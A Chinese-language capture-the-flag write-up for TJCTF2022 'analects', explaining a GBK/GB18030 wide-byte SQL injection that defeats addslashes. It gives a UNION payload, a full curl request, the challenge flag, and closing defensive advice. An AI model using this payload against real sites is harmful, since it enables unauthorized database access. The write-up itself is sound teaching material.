# TJCTF2022 analects

## 题目简述

站点用 PHP 和 MySQL 搜索《论语》中英文文本。前端把查询按 GB18030 编码后逐字节 URL 编码；后端却仅对原始字节串调用 `addslashes`，再直接拼接到两个 `LIKE` 条件中。多字节编码会吞掉转义反斜杠，从而形成宽字节 SQL 注入。

## 解题过程

正常单引号 `0x27` 经 `addslashes` 变成 `0x5c 0x27`，无法闭合字符串。若在它前面放入 `0xbf`，后端添加反斜杠后形成 `0xbf 0x5c 0x27`；在 GB18030/GBK 语境下，前两字节被解释为一个多字节字符，末尾的 `0x27` 重新成为有效引号。

查询原本从 `analects` 取六列，因此 UNION 也提供六列，并把 flag 放在第一列：

```text
%BF%27 union select flag,1,1,1,1,1 from flag; -- -
```

完整请求可以写成：

```bash
curl -s 'http://target/search.php?q=%BF%27%20union%20select%20flag,1,1,1,1,1%20from%20flag%3B%20--%20'
```

返回 JSON 的首个对象中，`id` 字段即为 `tjctf{h0w_t0_h4v3_go0d_mor4l5??}`。

## 方法总结

`addslashes` 不是 SQL 参数化，更不能在多字节字符集中提供可靠边界。排查此类问题时必须沿整条编码链跟踪字节：浏览器编码、URL 解码、PHP 转义、数据库连接字符集和 SQL 解析缺一不可。最终防护应使用预编译语句，并显式统一连接与数据编码。
